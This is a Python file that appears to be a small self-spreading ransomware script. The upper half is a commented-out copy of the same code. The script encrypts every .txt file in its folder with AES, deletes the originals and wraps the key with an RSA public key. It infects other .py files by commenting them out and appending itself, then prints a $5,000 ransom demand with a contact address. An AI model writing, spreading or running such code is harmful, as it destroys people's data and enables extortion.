#
#from base64 import b64encode
#from Crypto.Cipher import AES, PKCS1_OAEP
#from Crypto.Util.Padding import pad
#from Crypto.Random import get_random_bytes
#from Crypto.PublicKey import RSA
#import os
#import shutil
#import fnmatch
#import ctypes
#
#with open('key.txt', 'wb') as f:
#    f.write(get_random_bytes(32))
#with open('key.txt', 'rb') as f:
#    cipher = AES.new(f.read(), AES.MODE_CBC)
#
#with open('key.txt', 'rb') as fr:
#    with open('key.bin', 'wb') as fw:
#        cipher_rsa = PKCS1_OAEP.new(RSA.import_key(open('receiver.pem').read()))
#        enc_data = cipher_rsa.encrypt(fr.read())
#        fw.write(enc_data)
#        fw.close()
#    fr.close()
#os.remove('key.txt')
#
#with open('receiver.pem', 'r') as f:
#    p_key = f.read()
#    f.close()
#
#for file in os.listdir('.'):
#    if fnmatch.fnmatch(file, '*.txt'):
#        if file != 'key.txt':
#            with open(file, 'rb') as f:
#                data = f.read()
#            cipher_text_bytes = cipher.encrypt(pad(data, 32))
#            iv = b64encode(cipher.iv).decode('utf-8')
#            cipher_text = b64encode(cipher_text_bytes).decode('utf-8')
#            f_encoded = file[0:-4] + '.enc'
#            with open(f_encoded, 'w') as f:
#                f.write(cipher_text)
#            os.remove(file)
#    if fnmatch.fnmatch(file, '*.py'):
#        if file != os.path.basename(__file__):
#            with open(file) as reader:
#                lines = reader.readlines()
#            with open(file, 'w') as f:
#                for i in range(len(lines)):
#                    f.write('#' + lines[i])
#            with open(os.path.basename(__file__), 'r') as f:
#                with open(file, 'a+') as fw:
#                    fw.write(f.read())
#                    fw.write("public_key = " + '"""' + p_key + '"""')
#
#
#with open('iv.pem', 'w') as f:
#    f.write(iv)
#    f.close()
#
#print( "Your text files are encrypted. To decrypt "
#            + "them, you need to pay me $5,000 and send key.bin in your folder "
#            + " sfm999@uowmail.edu.au")
#iv = 'r9vi8GIWqxzRd+/6VxnXpA=='

from base64 import b64encode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
import os
import shutil
import fnmatch
import ctypes

with open('key.txt', 'wb') as f:
    f.write(get_random_bytes(32))
with open('key.txt', 'rb') as f:
    cipher = AES.new(f.read(), AES.MODE_CBC)

for file in os.listdir('.'):
    if fnmatch.fnmatch(file, '*.txt'):
        if file != 'key.txt':
            with open(file, 'rb') as f:
                data = f.read()
            cipher_text_bytes = cipher.encrypt(pad(data, 32))
            iv = b64encode(cipher.iv).decode('utf-8')
            cipher_text = b64encode(cipher_text_bytes).decode('utf-8')
            f_encoded = file[0:-4] + '.enc'
            with open(f_encoded, 'w') as f:
                f.write(cipher_text)
            os.remove(file)
    if fnmatch.fnmatch(file, '*.py'):
        if file != os.path.basename(__file__):
            with open(file) as reader:
                lines = reader.readlines()
            with open(file, 'w') as f:
                for i in range(len(lines)):
                    f.write('#' + lines[i])
            with open(os.path.basename(__file__), 'r') as f:
                with open(file, 'a+') as fr:
                    fr.write(f.read())
                    fr.write("iv = '" + iv + "'")

with open('key.txt', 'rb') as fr:
    with open('key.bin', 'wb') as fw:
        cipher_rsa = PKCS1_OAEP.new(RSA.import_key(open('receiver.pem').read()))
        enc_data = cipher_rsa.encrypt(fr.read())
        fw.write(enc_data)
        fw.close()
os.remove('key.txt')
with open('iv.pem', 'w') as f:
    f.write(iv)
    f.close()

print( "Your text files are encrypted. To decrypt "
            + "them, you need to pay me $5,000 and send key.bin in your folder "
            + " sfm999@uowmail.edu.au")
iv = 'r9vi8GIWqxzRd+/6VxnXpA=='
